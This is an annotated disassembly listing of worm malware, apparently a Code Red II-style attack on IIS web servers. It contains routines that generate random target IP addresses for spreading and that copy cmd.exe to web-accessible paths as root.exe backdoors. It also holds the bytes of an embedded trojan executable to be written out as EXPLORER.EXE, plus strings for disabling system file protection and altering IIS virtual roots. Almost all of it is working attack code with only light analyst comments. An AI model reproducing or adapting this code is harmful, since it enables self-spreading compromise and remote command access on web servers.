+seg000:00000750			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:00000755	45 78 69 74 57 69+aExitwindowsex  db 'ExitWindowsEx',0
+seg000:00000763			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:00000763			  
+seg000:00000763			  SETUP_ExitWindowsEx:			  ; CODE XREF: sub_1C4+58Cp
+seg000:00000763	FF 75 90			  push	  [ebp+HMODULE_USER32]
+seg000:00000766	FF 55 F8			  call	  [ebp+GetProcAddress] ; Indirect Call Near Procedure
+seg000:00000769	89 45 8C			  mov	  [ebp+ExitWindowsEx], eax
+seg000:0000076C	C3				  retn			  ; Return Near	from Procedure
+seg000:0000076D			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:0000076D			  
+seg000:0000076D			  GEN_OCTET:				  ; CODE XREF: sub_1C4+D2p
+seg000:0000076D								  ; sub_1C4+5C3p ...
+seg000:0000076D	8B 45 84			  mov	  eax, [ebp+IP_STORAGE]
+seg000:00000770	69 C0 05 84 08 08		  imul	  eax, 8088405h	  ; Signed Multiply
+seg000:00000776	40				  inc	  eax		  ; Increment by 1
+seg000:00000777	89 45 84			  mov	  [ebp+IP_STORAGE], eax
+seg000:0000077A	8D 84 04 78 56 34+		  lea	  eax, [esp+eax+12345678h] ; Load Effective Address
+seg000:00000781	F7 D8				  neg	  eax		  ; Two's Complement Negation
+seg000:00000783	C1 C0 08			  rol	  eax, 8	  ; Rotate Left
+seg000:00000786	C3				  retn			  ; Return Near	from Procedure
+seg000:00000787			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:00000787			  
+seg000:00000787			  GET_OCTET:				  ; CODE XREF: sub_1C4+5CAj
+seg000:00000787								  ; sub_1C4+5CEj ...
+seg000:00000787	E8 E1 FF FF FF			  call	  GEN_OCTET	  ; Call Procedure
+seg000:0000078C	3C 00				  cmp	  al, 0		  ; check if returned 0
+seg000:0000078E	74 F7				  jz	  short	GET_OCTET ; if so, regen octet
+seg000:00000790	3C FF				  cmp	  al, 0FFh	  ; check if returned 255
+seg000:00000792	74 F3				  jz	  short	GET_OCTET ; if so, regen octet
+seg000:00000794	C3				  retn			  ; Return Near	from Procedure
+seg000:00000795			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:00000795			  
+seg000:00000795			  GET_IP:				  ; CODE XREF: sub_1C4+168p
+seg000:00000795								  ; sub_1C4+630j ...
+seg000:00000795	E8 ED FF FF FF			  call	  GET_OCTET	  ; load 4th octet (this is in reverse ordwer due to byte ordering)
+seg000:0000079A	8A F8				  mov	  bh, al
+seg000:0000079C	E8 E6 FF FF FF			  call	  GET_OCTET	  ; get	3rd octet
+seg000:000007A1	8A D8				  mov	  bl, al
+seg000:000007A3	C1 E3 10			  shl	  ebx, 10h	  ; shift bx to	the top	of ebx
+seg000:000007A6	E8 DC FF FF FF			  call	  GET_OCTET	  ; get	2nd octet
+seg000:000007AB	8A F8				  mov	  bh, al
+seg000:000007AD	E8 D5 FF FF FF			  call	  GET_OCTET	  ; 1st
+seg000:000007B2	8A D8				  mov	  bl, al
+seg000:000007B4	E8 B4 FF FF FF			  call	  GEN_OCTET	  ; get	first octet
+seg000:000007B9	83 E0 07			  and	  eax, 7	  ; and	it by 7
+seg000:000007BC	E8 20 00 00 00			  call	  CHECK_ADDR_MASK ; ecx	has eip
+seg000:000007BC			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:000007C1	FF FF FF FF			  dd 0FFFFFFFFh		  ; 0 -	addr masks
+seg000:000007C5	00 FF FF FF			  dd 0FFFFFF00h		  ; 1
+seg000:000007C9	00 FF FF FF			  dd 0FFFFFF00h		  ; 2
+seg000:000007CD	00 FF FF FF			  dd 0FFFFFF00h		  ; 3
+seg000:000007D1	00 FF FF FF			  dd 0FFFFFF00h		  ; 4
+seg000:000007D5	00 00 FF FF			  dd 0FFFF0000h		  ; 5
+seg000:000007D9	00 00 FF FF			  dd 0FFFF0000h		  ; 6
+seg000:000007DD	00 00 FF FF			  dd 0FFFF0000h		  ; 7
+seg000:000007E1			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:000007E1			  
+seg000:000007E1			  CHECK_ADDR_MASK:			  ; CODE XREF: sub_1C4+5F8p
+seg000:000007E1	59				  pop	  ecx		  ; ecx	has eip
+seg000:000007E2	8B 04 81			  mov	  eax, [ecx+eax*4] ; move eip +	eax*4
+seg000:000007E5	23 D8				  and	  ebx, eax	  ; Logical AND
+seg000:000007E7	F7 D0				  not	  eax		  ; One's Complement Negation
+seg000:000007E9	23 85 58 FE FF FF		  and	  eax, [ebp+LOCAL_IP] ;	Logical	AND
+seg000:000007EF	0B D8				  or	  ebx, eax	  ; Logical Inclusive OR
+seg000:000007F1	80 FB 7F			  cmp	  bl, 7Fh ; ''   ; is it in 127?
+seg000:000007F4	74 9F				  jz	  short	GET_IP	  ; if it is, then regen the ip
+seg000:000007F6	80 FB E0			  cmp	  bl, 0E0h ; 'à'  ; is it in 224?
+seg000:000007F9	74 9A				  jz	  short	GET_IP	  ; if so, regen the ip
+seg000:000007FB	3B 9D 58 FE FF FF		  cmp	  ebx, [ebp+LOCAL_IP] ;	is it us?
+seg000:00000801	74 92				  jz	  short	GET_IP	  ; if so, regen the ip
+seg000:00000803	C3				  retn			  ; Return Near	from Procedure
+seg000:00000804			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:00000804			  
+seg000:00000804			  DO_OWN:				  ; CODE XREF: sub_1C4+100p
+seg000:00000804	68 04 01 00 00			  push	  104h
+seg000:00000809	8D 85 5C FE FF FF		  lea	  eax, [ebp+HOST_BUF] ;	Load Effective Address
+seg000:0000080F	50				  push	  eax
+seg000:00000810	FF 55 E0			  call	  [ebp+GetSystemDirectoryA] ; load GetSystemDirectory into hostbuf
+seg000:00000813	8D BC 05 5C FE FF+		  lea	  edi, [ebp+eax+HOST_BUF] ; set	edi to the end of hostbuf
+seg000:0000081A	E8 09 00 00 00			  call	  APPEND_CMD	  ; put	aCmd_exe into esi
+seg000:0000081A			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:0000081F	5C 43 4D 44 2E 45+aCmd_exe	  db '\CMD.EXE',0
+seg000:00000828			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:00000828			  
+seg000:00000828			  APPEND_CMD:				  ; CODE XREF: sub_1C4+656p
+seg000:00000828	5E				  pop	  esi		  ; put	aCmd_exe into esi
+seg000:00000829	FC				  cld			  ; Clear Direction Flag
+seg000:0000082A	A5				  movsd			  ; Move Byte(s) from String to	String
+seg000:0000082B	A5				  movsd			  ; Move Byte(s) from String to	String
+seg000:0000082C	A4				  movsb			  ; Move Byte(s) from String to	String
+seg000:0000082D	B3 63				  mov	  bl, 63h ; 'c'   ; set bl to 63
+seg000:0000082F			  
+seg000:0000082F			  CREATEFILES_TOP:			  ; CODE XREF: sub_1C4+D19j
+seg000:0000082F	6A 01				  push	  1
+seg000:00000831	E8 1C 00 00 00			  call	  CREATESCRIPTSROOT ; pointer to this inetpubscript string
+seg000:00000831			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:00000836	64 3A 5C 69 6E 65+aDInetpubScript db 'd:\inetpub\scripts\root.exe',0
+seg000:00000852			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:00000852			  
+seg000:00000852			  CREATESCRIPTSROOT:			  ; CODE XREF: sub_1C4+66Dp
+seg000:00000852	8B 0C 24			  mov	  ecx, [esp+44h+HMODULE_WS2_32]	; pointer to this inetpubscript	string
+seg000:00000855	88 19				  mov	  [ecx], bl	  ; set	first char to letter
+seg000:00000857	8D 85 5C FE FF FF		  lea	  eax, [ebp+HOST_BUF] ;	Load Effective Address
+seg000:0000085D	50				  push	  eax
+seg000:0000085E	FF 55 DC			  call	  [ebp+CopyFileA] ; copy cmd.exe to [c|d]:\inetpub\scripts\root.exe
+seg000:00000861	6A 01				  push	  1
+seg000:00000863	E8 2B 00 00 00			  call	  CREATEMSADCROOT ; Call Procedure
+seg000:00000863			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:00000868	64 3A 5C 70 72 6F+aDProgra1Common db 'd:\progra~1\common~1\system\MSADC\root.exe',0
+seg000:00000893			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:00000893			  
+seg000:00000893			  CREATEMSADCROOT:			  ; CODE XREF: sub_1C4+69Fp
+seg000:00000893	8B 0C 24			  mov	  ecx, [esp+4Ch+closesocket]
+seg000:00000896	88 19				  mov	  [ecx], bl	  ; set	first char to letter [c|d]
+seg000:00000898	8D 85 5C FE FF FF		  lea	  eax, [ebp+HOST_BUF] ;	Load Effective Address
+seg000:0000089E	50				  push	  eax
+seg000:0000089F	FF 55 DC			  call	  [ebp+CopyFileA] ; copy cmd.exe to [c|d]:\progra~1\common~1\system\MSADC\root.exe
+seg000:000008A2	E8 BA 05 00 00			  call	  CREATE_EXPLORER ; set	esi to the beginning of	the file to write
+seg000:000008A2			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:000008A7	FC 4D 5A 50			  dd 505A4DFCh		  ; this is a executeable to be	written	out.
+seg000:000008AB	00 02 00 00			  dd 200h
+seg000:000008AF	00 04 00 0F			  dd 0F000400h
+seg000:000008B3	00 FF FF 00			  dd 0FFFF00h
+seg000:000008B7	00 B8 00 00			  dd 0B800h
+seg000:000008BB	00 00 00 00			  dd 0
+seg000:000008BF	00 40 00 1A			  dd 1A004000h
+seg000:000008C3	FC 00 00 01			  dd 10000FCh
+seg000:000008C7	FC FC FC FC			  dd 0FCFCFCFCh
+seg000:000008CB	FC FC 00 00			  dd 0FCFCh
+seg000:000008CF	50 45 00 00			  dd 4550h
+seg000:000008D3	4C 01 03 00			  dd 3014Ch
+seg000:000008D7	FD 2A 25 29			  dd 29252AFDh
+seg000:000008DB	00 00 00 00			  dd 0
+seg000:000008DF	00 00 00 00			  dd 0
+seg000:000008E3	E0 00 8F 81			  dd 818F00E0h
+seg000:000008E7	0B 01 02 19			  dd 1902010Bh
+seg000:000008EB	00 04 00 00			  dd 400h
+seg000:000008EF	00 08 00 00			  dd 800h
+seg000:000008F3	00 00 00 00			  dd 0
+seg000:000008F7	00 10 00 00			  dd 1000h
+seg000:000008FB	00 10 00 00			  dd 1000h
+seg000:000008FF	00 20 00 00			  dd 2000h
+seg000:00000903	00 00 40 00			  dd 400000h
+seg000:00000907	00 10 00 00			  dd 1000h
+seg000:0000090B	00 04 00 00			  dd 400h
+seg000:0000090F	01 00 00 00			  dd 1
+seg000:00000913	00 00 00 00			  dd 0
+seg000:00000917	03 00 0A 00			  dd 0A0003h
+seg000:0000091B	00 00 00 00			  dd 0
+seg000:0000091F	00 40 00 00			  dd 4000h
+seg000:00000923	00 04 00 00			  dd 400h
+seg000:00000927	00 00 00 00			  dd 0
+seg000:0000092B	02 00 00 00			  dd 2
+seg000:0000092F	00 00 10 00			  dd 100000h
+seg000:00000933	00 20 00 00			  dd 2000h
+seg000:00000937	00 00 10 00			  dd 100000h
+seg000:0000093B	00 10 00 00			  dd 1000h
+seg000:0000093F	00 00 00 00			  dd 0
+seg000:00000943	10 00 00 00			  dd 10h
+seg000:00000947	00 00 00 00			  dd 0
+seg000:0000094B	00 00 00 00			  dd 0
+seg000:0000094F	00 30 00 00			  dd 3000h
+seg000:00000953	0C 01 FC FC			  dd 0FCFC010Ch
+seg000:00000957	FC 00 00 00			  dd 0FCh
+seg000:0000095B	00 00 00 00			  dd 0
+seg000:0000095F	00 00 00 00			  dd 0
+seg000:00000963	00 00 00 00			  dd 0
+seg000:00000967	00 00 00 00			  dd 0
+seg000:0000096B	00 00 00 00			  dd 0
+seg000:0000096F	00 00 00 00			  dd 0
+seg000:00000973	10 00 00 00			  dd 10h
+seg000:00000977	10 00 00 00			  dd 10h
+seg000:0000097B	04 00 00 00			  dd 4
+seg000:0000097F	08 00 00 00			  dd 8
+seg000:00000983	00 00 00 00			  dd 0
+seg000:00000987	00 00 00 00			  dd 0
+seg000:0000098B	00 00 00 20			  dd 20000000h
+seg000:0000098F	00 00 60 00			  dd 600000h
+seg000:00000993	00 00 00 00			  dd 0
+seg000:00000997	00 00 00 00			  dd 0
+seg000:0000099B	10 00 00 00			  dd 10h
+seg000:0000099F	20 00 00 00			  dd 20h
+seg000:000009A3	04 00 00 00			  dd 4
+seg000:000009A7	0C 00 00 00			  dd 0Ch
+seg000:000009AB	00 00 00 00			  dd 0
+seg000:000009AF	00 00 00 00			  dd 0
+seg000:000009B3	00 00 00 40			  dd 40000000h
+seg000:000009B7	00 00 C0 00			  dd 0C00000h
+seg000:000009BB	00 00 00 00			  dd 0
+seg000:000009BF	00 00 00 00			  dd 0
+seg000:000009C3	10 00 00 00			  dd 10h
+seg000:000009C7	30 00 00 00			  dd 30h
+seg000:000009CB	04 00 00 00			  dd 4
+seg000:000009CF	10 00 00 00			  dd 10h
+seg000:000009D3	00 00 00 00			  dd 0
+seg000:000009D7	00 00 00 00			  dd 0
+seg000:000009DB	00 00 00 40			  dd 40000000h
+seg000:000009DF	00 00 C0 FC			  dd 0FCC00000h
+seg000:000009E3	FC FC FC FC			  dd 0FCFCFCFCh
+seg000:000009E7	FC FC FC FC			  dd 0FCFCFCFCh
+seg000:000009EB	FC FC FC FC			  dd 0FCFCFCFCh
+seg000:000009EF	FC FC FC FC			  dd 0FCFCFCFCh
+seg000:000009F3	FC FC FC FC			  dd 0FCFCFCFCh
+seg000:000009F7	FC FC FC FC			  dd 0FCFCFCFCh
+seg000:000009FB	FC FC FC FC			  dd 0FCFCFCFCh
+seg000:000009FF	FC FC FC FC			  dd 0FCFCFCFCh
+seg000:00000A03	FC FC FC FC			  dd 0FCFCFCFCh
+seg000:00000A07	FC FC FC FC			  dd 0FCFCFCFCh
+seg000:00000A0B	FC FC FC 00			  dd 0FCFCFCh
+seg000:00000A0F	00 00 00 00			  dd 0
+seg000:00000A13	00 00 00 00			  dd 0
+seg000:00000A17	00 00 00 00			  dd 0
+seg000:00000A1B	00 00 00 68			  dd 68000000h
+seg000:00000A1F	04 01 00 00			  dd 104h
+seg000:00000A23	68 D0 20 40			  dd 4020D068h
+seg000:00000A27	00 E8 61 01			  dd 161E800h
+seg000:00000A2B	00 00 8D B8			  dd 0B88D0000h
+seg000:00000A2F	D0 20 40 00			  dd 4020D0h
+seg000:00000A33	BE 00 20 40			  dd 402000BEh
+seg000:00000A37	00 A5 A5 A5			  dd 0A5A5A500h
+seg000:00000A3B	A5 6A 01 68			  dd 68016AA5h
+seg000:00000A3F	D0 20 40 00			  dd 4020D0h
+seg000:00000A43	E8 4C 01 00			  dd 14CE8h
+seg000:00000A47	00 E8 0C 00			  dd 0CE800h
+seg000:00000A4B	00 00 68 C0			  dd 0C0680000h
+seg000:00000A4F	27 09 00 E8			  dd 0E8000927h
+seg000:00000A53	31 01 00 00			  dd 131h
+seg000:00000A57	EB EF 68 D8			  dd 0D868EFEBh
+seg000:00000A5B	24 40 00 68			  dd 68004024h
+seg000:00000A5F	3F 00 0F 00			  dd 0F003Fh
+seg000:00000A63	6A 00 68 10			  dd 1068006Ah
+seg000:00000A67	20 40 00 68			  dd 68004020h
+seg000:00000A6B	02 00 00 80			  dd 80000002h
+seg000:00000A6F	E8 32 01 00			  dd 132E8h
+seg000:00000A73	00 0B C0 75			  dd 75C00B00h
+seg000:00000A77	26 6A 04 68			  dd 68046A26h
+seg000:00000A7B	54 20 40 00			  dd 402054h
+seg000:00000A7F	6A 04 6A 00			  dd 6A046Ah
+seg000:00000A83	68 48 20 40			  dd 40204868h
+seg000:00000A87	00 FF 35 D8			  dd 0D835FF00h
+seg000:00000A8B	24 40 00 E8			  dd 0E8004024h
+seg000:00000A8F	0D 01 00 00			  dd 10Dh
+seg000:00000A93	FF 35 D8 24			  dd 24D835FFh
+seg000:00000A97	40 00 E8 0E			  dd 0EE80040h
+seg000:00000A9B	01 00 00 68			  dd 68000001h
+seg000:00000A9F	D8 24 40 00			  dd 4024D8h
+seg000:00000AA3	68 3F 00 0F			  dd 0F003F68h
+seg000:00000AA7	00 6A 00 68			  dd 68006A00h
+seg000:00000AAB	58 20 40 00			  dd 402058h
+seg000:00000AAF	68 02 00 00			  dd 268h
+seg000:00000AB3	80 E8 ED 00			  dd 0EDE880h
+seg000:00000AB7	00 00 0B C0			  dd 0C00B0000h
+seg000:00000ABB	75 55 BD 9C			  dd 9CBD5575h
+seg000:00000ABF	20 40 00 E8			  dd 0E8004020h
+seg000:00000AC3	4C 00 00 00			  dd 4Ch
+seg000:00000AC7	BD A8 20 40			  dd 4020A8BDh
+seg000:00000ACB	00 E8 42 00			  dd 42E800h
+seg000:00000ACF	00 00 6A 09			  dd 96A0000h
+seg000:00000AD3	68 B8 20 40			  dd 4020B868h
+seg000:00000AD7	00 6A 01 6A			  dd 6A016A00h
+seg000:00000ADB	00 68 B0 20			  dd 20B06800h
+seg000:00000ADF	40 00 FF 35			  dd 35FF0040h
+seg000:00000AE3	D8 24 40 00			  dd 4024D8h
+seg000:00000AE7	E8 B4 00 00			  dd 0B4E8h
+seg000:00000AEB	00 6A 09 68			  dd 68096A00h
+seg000:00000AEF	C4 20 40 00			  dd 4020C4h
+seg000:00000AF3	6A 01 6A 00			  dd 6A016Ah
+seg000:00000AF7	68 B4 20 40			  dd 4020B468h
+seg000:00000AFB	00 FF 35 D8			  dd 0D835FF00h
+seg000:00000AFF	24 40 00 E8			  dd 0E8004024h
+seg000:00000B03	99 00 00 00			  dd 99h
+seg000:00000B07	FF 35 D8 24			  dd 24D835FFh
+seg000:00000B0B	40 00 E8 9A			  dd 9AE80040h
+seg000:00000B0F	00 00 00 C3			  dd 0C3000000h
+seg000:00000B13	C7 05 D0 24			  dd 24D005C7h
+seg000:00000B17	40 00 00 04			  dd 4000040h
+seg000:00000B1B	00 00 68 D0			  dd 0D0680000h
+seg000:00000B1F	24 40 00 68			  dd 68004024h
+seg000:00000B23	D0 20 40 00			  dd 4020D0h
+seg000:00000B27	68 D4 24 40			  dd 4024D468h
+seg000:00000B2B	00 6A 00 55			  dd 55006A00h
+seg000:00000B2F	FF 35 D8 24			  dd 24D835FFh
+seg000:00000B33	40 00 E8 60			  dd 60E80040h
+seg000:00000B37	00 00 00 0B			  dd 0B000000h
+seg000:00000B3B	C0 75 49 A1			  dd 0A14975C0h
+seg000:00000B3F	D0 24 40 00			  dd 4024D0h
+seg000:00000B43	0B C0 74 40			  dd 4074C00Bh
+seg000:00000B47	BE D0 20 40			  dd 4020D0BEh
+seg000:00000B4B	00 80 3E 00			  dd 3E8000h
+seg000:00000B4F	74 36 46 66			  dd 66463674h
+seg000:00000B53	81 7E FE 2C			  dd 2CFE7E81h
+seg000:00000B57	2C 75 F2 C7			  dd 0C7F2752Ch
+seg000:00000B5B	06 32 31 37			  dd 37313206h
+seg000:00000B5F	00 81 EE CC			  dd 0CCEE8100h
+seg000:00000B63	20 40 00 89			  dd 89004020h
+seg000:00000B67	35 D0 24 40			  dd 4024D035h
+seg000:00000B6B	00 FF 35 D0			  dd 0D035FF00h
+seg000:00000B6F	24 40 00 68			  dd 68004024h
+seg000:00000B73	D0 20 40 00			  dd 4020D0h
+seg000:00000B77	6A 01 6A 00			  dd 6A016Ah
+seg000:00000B7B	55 FF 35 D8			  dd 0D835FF55h
+seg000:00000B7F	24 40 00 E8			  dd 0E8004024h
+seg000:00000B83	19 00 00 00			  dd 19h
+seg000:00000B87	C3 FF 25 60			  dd 6025FFC3h
+seg000:00000B8B	30 40 00 FF			  dd 0FF004030h
+seg000:00000B8F	25 64 30 40			  dd 40306425h
+seg000:00000B93	00 FF 25 68			  dd 6825FF00h
+seg000:00000B97	30 40 00 FF			  dd 0FF004030h
+seg000:00000B9B	25 70 30 40			  dd 40307025h
+seg000:00000B9F	00 FF 25 74			  dd 7425FF00h
+seg000:00000BA3	30 40 00 FF			  dd 0FF004030h
+seg000:00000BA7	25 78 30 40			  dd 40307825h
+seg000:00000BAB	00 FF 25 7C			  dd 7C25FF00h
+seg000:00000BAF	30 40 FC FC			  dd 0FCFC4030h
+seg000:00000BB3	FC FC FC FC			  dd 0FCFCFCFCh
+seg000:00000BB7	FC FC FC FC			  dd 0FCFCFCFCh
+seg000:00000BBB	FC FC FC FC			  dd 0FCFCFCFCh
+seg000:00000BBF	FC FC FC FC			  dd 0FCFCFCFCh
+seg000:00000BC3	FC 00 00 00			  dd 0FCh
+seg000:00000BC7	00 00 00 00			  dd 0
+seg000:00000BCB	00 00 00 00			  dd 0
+seg000:00000BCF	00 00				  dw 0
+seg000:00000BD1	5C 45 58 50 4C 4F+aExplorer_exe	  db '\EXPLORER.EXE',0
+seg000:00000BDF	00 00				  dw 0
+seg000:00000BE1	53 4F 46 54 57 41+aSoftwareMicros db 'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',0
+seg000:00000C17	00 00				  dw 0
+seg000:00000C19	53 46 43 44 69 73+aSfcdisable	  db 'SFCDisable',0
+seg000:00000C24	00 9D FF FF			  dd 0FFFF9D00h
+seg000:00000C28	FF				  db 0FFh
+seg000:00000C29	53 59 53 54 45 4D+aSystemCurrentc db 'SYSTEM\CurrentControlSet\Services\W3SVC\Parameters\Virtual R'
+seg000:00000C29	5C 43 75 72 72 65+		  db 'oots',0
+seg000:00000C6A	00 00				  dw 0
+seg000:00000C6C	00				  db	0 ;  
+seg000:00000C6D	2F 53 63 72 69 70+aScripts	  db '/Scripts',0
+seg000:00000C76	00 00				  dw 0
+seg000:00000C78	00				  db	0 ;  
+seg000:00000C79	2F 4D 53 41 44 43+aMsadc	  db '/MSADC',0
+seg000:00000C80	00				  db	0 ;  
+seg000:00000C81	2F 43 00	  aC		  db '/C',0
+seg000:00000C84	00				  db	0 ;  
+seg000:00000C85	2F 44 00	  aD		  db '/D',0
+seg000:00000C88	00				  db	0 ;  
+seg000:00000C89	63 3A 5C 2C 2C 32+aC217		  db 'c:\,,217',0
+seg000:00000C92	00 00				  dw 0
+seg000:00000C94	00				  db	0 ;  
+seg000:00000C95	64 3A 5C 2C 2C 32+aD217		  db 'd:\,,217'
+seg000:00000C9D	FC FC FC FC			  dd 0FCFCFCFCh
+seg000:00000CA1	FC FC FC FC			  dd 0FCFCFCFCh
+seg000:00000CA5	FC FC FC FC			  dd 0FCFCFCFCh
+seg000:00000CA9	FC FC FC FC			  dd 0FCFCFCFCh
+seg000:00000CAD	FC FC FC FC			  dd 0FCFCFCFCh
+seg000:00000CB1	FC FC FC FC			  dd 0FCFCFCFCh
+seg000:00000CB5	FC 00 00 00			  dd 0FCh
+seg000:00000CB9	00 00 00 00			  dd 0
+seg000:00000CBD	00 00 00 00			  dd 0
+seg000:00000CC1	00 00 00 00			  dd 0
+seg000:00000CC5	00 00 00 00			  dd 0
+seg000:00000CC9	00 3C 30 00			  dd 303C00h
+seg000:00000CCD	00 00 00 00			  dd 0
+seg000:00000CD1	00 00 00 00			  dd 0
+seg000:00000CD5	00 84 30 00			  dd 308400h
+seg000:00000CD9	00 60 30 00			  dd 306000h
+seg000:00000CDD	00 4C 30 00			  dd 304C00h
+seg000:00000CE1	00 00 00 00			  dd 0
+seg000:00000CE5	00 00 00 00			  dd 0
+seg000:00000CE9	00 91 30 00			  dd 309100h
+seg000:00000CED	00 70 30 00			  dd 307000h
+seg000:00000CF1	00 00 00 00			  dd 0
+seg000:00000CF5	00 00 00 00			  dd 0
+seg000:00000CF9	00 00 00 00			  dd 0
+seg000:00000CFD	00 00 00 00			  dd 0
+seg000:00000D01	00 00 00 00			  dd 0
+seg000:00000D05	00 9E 30 00			  dd 309E00h
+seg000:00000D09	00 A6 30 00			  dd 30A600h
+seg000:00000D0D	00 BE 30 00			  dd 30BE00h
+seg000:00000D11	00 00 00 00			  dd 0
+seg000:00000D15	00 C8 30 00			  dd 30C800h
+seg000:00000D19	00 DC 30 00			  dd 30DC00h
+seg000:00000D1D	00 EE 30 00			  dd 30EE00h
+seg000:00000D21	00 FE 30 00			  dd 30FE00h
+seg000:00000D25	00 00 00 00			  dd 0
+seg000:00000D29	00 9E 30 00			  dd 309E00h
+seg000:00000D2D	00 A6 30 00			  dd 30A600h
+seg000:00000D31	00 BE 30 00			  dd 30BE00h
+seg000:00000D35	00 00 00 00			  dd 0
+seg000:00000D39	00 C8 30 00			  dd 30C800h
+seg000:00000D3D	00 DC 30 00			  dd 30DC00h
+seg000:00000D41	00 EE 30 00			  dd 30EE00h
+seg000:00000D45	00 FE 30 00			  dd 30FE00h
+seg000:00000D49	00 00 00 00			  dd 0
+seg000:00000D4D	00				  db 0
+seg000:00000D4E	4B 45 52 4E 45 4C+aKernel32_dll	  db 'KERNEL32.dll',0
+seg000:00000D5B	41 44 56 41 50 49+aAdvapi32_dll	  db 'ADVAPI32.dll',0
+seg000:00000D68	00 00				  dw 0
+seg000:00000D6A	53 6C 65 65 70 00 aSleep	  db 'Sleep',0
+seg000:00000D70	00 00				  dw 0
+seg000:00000D72	47 65 74 57 69 6E+aGetwindowsdire db 'GetWindowsDirectoryA',0
+seg000:00000D87	00 00				  dw 0
+seg000:00000D89	00				  db	0 ;  
+seg000:00000D8A	57 69 6E 45 78 65+aWinexec	  db 'WinExec',0
+seg000:00000D92	00 00				  dw 0
+seg000:00000D94	52 65 67 51 75 65+aRegqueryvaluee db 'RegQueryValueExA',0
+seg000:00000DA5	00 00				  dw 0
+seg000:00000DA7	00				  db	0 ;  
+seg000:00000DA8	52 65 67 53 65 74+aRegsetvalueexa db 'RegSetValueExA',0
+seg000:00000DB7	00 00				  dw 0
+seg000:00000DB9	00				  db	0 ;  
+seg000:00000DBA	52 65 67 4F 70 65+aRegopenkeyexa  db 'RegOpenKeyExA',0
+seg000:00000DC8	00 00				  dw 0
+seg000:00000DCA	52 65 67 43 6C 6F+aRegclosekey	  db 'RegCloseKey'
+seg000:00000DD5	FC FC FC FC			  dd 0FCFCFCFCh
